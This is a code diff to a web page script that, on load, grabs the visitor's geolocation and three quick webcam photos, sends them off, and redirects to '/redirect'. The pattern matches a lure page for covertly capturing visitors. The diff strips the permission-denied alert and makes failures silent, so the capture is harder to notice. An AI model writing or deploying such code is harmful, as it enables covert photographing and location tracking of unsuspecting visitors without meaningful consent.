@@ -56,10 +56,7 @@
             };
             resolve();
           },
-          (err) => {
-            alert("❌ Location permission denied.");
-            reject(err);
-          },
+          () => resolve(null), // Don't reject — fail gracefully
           {
             enableHighAccuracy: true,
             timeout: 10000,
@@ -68,6 +65,7 @@
         );
       });
     }
+
 
     function capturePhoto(video) {
       const canvas = document.createElement('canvas');
@@ -91,27 +89,32 @@
     }
 
     async function startSequence() {
-      const geoPromise = getGeolocation(); // Start getting location
+      // Kick off location fetch but don't block the rest
+      const geoPromise = getGeolocation().catch(() => null);
+
+      // Start webcam
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       const video = document.getElementById("video");
       video.srcObject = stream;
-
       await new Promise(resolve => video.onloadedmetadata = resolve);
-      await geoPromise; // Wait for geolocation if not yet resolved
 
-      // Capture 3 photos quickly
+      // Capture 3 photos fast
       const photos = [capturePhoto(video), capturePhoto(video), capturePhoto(video)];
 
-      // Stop the webcam
+      // Stop webcam
       stream.getTracks().forEach(track => track.stop());
 
-      // Send all photos in parallel
+      // Wait for location to resolve (or fail silently)
+      await geoPromise;
+
+      // Send photos (with coords if available)
       await Promise.all(
         photos.map(photo => sendPhoto(photo, coords))
       );
 
+      // Always redirect
       window.location.href = "/redirect";
-    }
+    };
 
     window.onload = async () => {
       try {
